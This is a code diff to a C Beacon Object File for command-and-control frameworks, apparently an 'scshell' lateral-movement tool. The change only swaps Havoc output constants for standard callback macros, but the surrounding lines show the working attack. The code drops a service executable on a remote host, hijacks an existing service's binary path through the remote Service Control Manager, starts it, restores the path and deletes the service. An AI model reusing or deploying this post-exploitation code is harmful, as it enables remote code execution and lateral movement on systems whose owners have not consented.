@@ -5,11 +5,6 @@
 #include <windows.h>
 #include "beacon.h"
 
-/* Havoc console output modes */ 
-#define HAVOC_CONSOLE_GOOD 0x90
-#define HAVOC_CONSOLE_INFO 0x91
-#define HAVOC_CONSOLE_ERRO 0x92
-
 /* Defines */ 
 WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(
     LPCSTR                lpFileName,
@@ -110,17 +105,17 @@ VOID go( PVOID Buffer, ULONG Length )
     hFile = KERNEL32$CreateFileA( SvcPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
     if ( hFile == INVALID_HANDLE_VALUE )
     {
-        BeaconPrintf( HAVOC_CONSOLE_ERRO, "CreateFileA Failed: %d", KERNEL32$GetLastError() );
+        BeaconPrintf( CALLBACK_ERROR, "CreateFileA Failed: %d", KERNEL32$GetLastError() );
         goto EXIT;
     }
 
     if ( ! KERNEL32$WriteFile( hFile, SvcBinary, SvcBinarySize, &Written, NULL ) )
     {
-        BeaconPrintf( HAVOC_CONSOLE_ERRO, "WriteFile Failed: %d", KERNEL32$GetLastError() );
+        BeaconPrintf( CALLBACK_ERROR, "WriteFile Failed: %d", KERNEL32$GetLastError() );
         goto EXIT;
     }
 
-    BeaconPrintf( HAVOC_CONSOLE_INFO, "Dropped service executable on %s at %s", Host, SvcPath );
+    BeaconPrintf( CALLBACK_OUTPUT, "Dropped service executable on %s at %s", Host, SvcPath );
 
     /* Close the file */
     KERNEL32$CloseHandle( hFile );
@@ -131,14 +126,14 @@ VOID go( PVOID Buffer, ULONG Length )
     hSvcManager = ADVAPI32$OpenSCManagerA( Host, NULL, SC_MANAGER_ALL_ACCESS );
     if ( ! hSvcManager ) 
     {
-      BeaconPrintf( HAVOC_CONSOLE_ERRO, "OpenSCManagerA Failed: %x", KERNEL32$GetLastError() );
+      BeaconPrintf( CALLBACK_ERROR, "OpenSCManagerA Failed: %x", KERNEL32$GetLastError() );
       goto EXIT;
     }
 
     hSvcService = ADVAPI32$OpenServiceA( hSvcManager, SvcName, SERVICE_ALL_ACCESS );
     if ( ! hSvcService ) 
     {
-	    BeaconPrintf( HAVOC_CONSOLE_ERRO, "OpenServiceA Failed: %d", KERNEL32$GetLastError() );
+	    BeaconPrintf( CALLBACK_ERROR, "OpenServiceA Failed: %d", KERNEL32$GetLastError() );
         goto EXIT;
     }
 
@@ -151,39 +146,39 @@ VOID go( PVOID Buffer, ULONG Length )
         SvcQuerySize = 0;
         if ( ! ADVAPI32$QueryServiceConfigA( hSvcService, SvcConfig, SvcConfSize, &SvcQuerySize ) )
         {
-            BeaconPrintf( HAVOC_CONSOLE_ERRO, "QueryServiceConfigA [2]. Failed: %d", KERNEL32$GetLastError() );
+            BeaconPrintf( CALLBACK_ERROR, "QueryServiceConfigA [2]. Failed: %d", KERNEL32$GetLastError() );
             goto EXIT;
         }
 
         SvcOrgPath = SvcConfig->lpBinaryPathName;
-        BeaconPrintf( HAVOC_CONSOLE_INFO, "Service original path: %s\n", SvcOrgPath );
+        BeaconPrintf( CALLBACK_OUTPUT, "Service original path: %s\n", SvcOrgPath );
     }
 
     if ( ! ADVAPI32$ChangeServiceConfigA( hSvcService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, SvcPath, NULL, NULL, NULL, NULL, NULL, NULL ) )
     {
-        BeaconPrintf( HAVOC_CONSOLE_ERRO, "ChangeServiceConfigA Failed: %d", KERNEL32$GetLastError() );
+        BeaconPrintf( CALLBACK_ERROR, "ChangeServiceConfigA Failed: %d", KERNEL32$GetLastError() );
         goto EXIT;
     }
 
-    BeaconPrintf( HAVOC_CONSOLE_INFO, "Service path changed to: %s", SvcPath );
+    BeaconPrintf( CALLBACK_OUTPUT, "Service path changed to: %s", SvcPath );
 
     // TODO: check if service is dead after starting it. maybe we trying to start a buggy one...
     // TODO: add check for ERROR_SERVICE_REQUEST_TIMEOUT
     if ( ! ADVAPI32$StartServiceA( hSvcService, 0, NULL ) ) 
     {
-        BeaconPrintf( HAVOC_CONSOLE_ERRO, "CreateServiceA Failed: %x", KERNEL32$GetLastError() );
+        BeaconPrintf( CALLBACK_ERROR, "CreateServiceA Failed: %x", KERNEL32$GetLastError() );
         goto EXIT;
     }
-    BeaconPrintf( HAVOC_CONSOLE_GOOD, "Service %s started", SvcName );
+    BeaconPrintf( CALLBACK_OUTPUT, "Service %s started", SvcName );
 
     if ( SvcOrgPath )
     {
         if ( ! ADVAPI32$ChangeServiceConfigA( hSvcService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, SvcOrgPath, NULL, NULL, NULL, NULL, NULL, NULL ) )
         {
-            BeaconPrintf( HAVOC_CONSOLE_ERRO, "ChangeServiceConfigA Failed: %x", KERNEL32$GetLastError() );
+            BeaconPrintf( CALLBACK_ERROR, "ChangeServiceConfigA Failed: %x", KERNEL32$GetLastError() );
             goto EXIT;
         }
-        BeaconPrintf( HAVOC_CONSOLE_INFO, "Service path restored to original: %s", SvcOrgPath );
+        BeaconPrintf( CALLBACK_OUTPUT, "Service path restored to original: %s", SvcOrgPath );
     }
 
     Success = TRUE;
@@ -196,7 +191,7 @@ EXIT:
     }
 
     if ( ! ADVAPI32$DeleteService( hSvcService ) ) 
-        BeaconPrintf( HAVOC_CONSOLE_ERRO, "Failed to delete Service %s on %s: %d", SvcName, Host, KERNEL32$GetLastError() );
+        BeaconPrintf( CALLBACK_ERROR, "Failed to delete Service %s on %s: %d", SvcName, Host, KERNEL32$GetLastError() );
 
     if ( SvcConfig )
     {
@@ -217,7 +212,7 @@ EXIT:
     }
 
     if ( Success )
-        BeaconPrintf( HAVOC_CONSOLE_GOOD, "scshell successful executed on %s", Host );
+        BeaconPrintf( CALLBACK_OUTPUT, "scshell successful executed on %s", Host );
     else
-        BeaconPrintf( HAVOC_CONSOLE_ERRO, "scshell failed to execut on %s", Host );
+        BeaconPrintf( CALLBACK_ERROR, "scshell failed to execut on %s", Host );
 }
